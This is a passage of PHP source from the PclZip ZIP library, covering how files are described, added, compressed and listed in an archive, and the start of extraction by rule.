    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
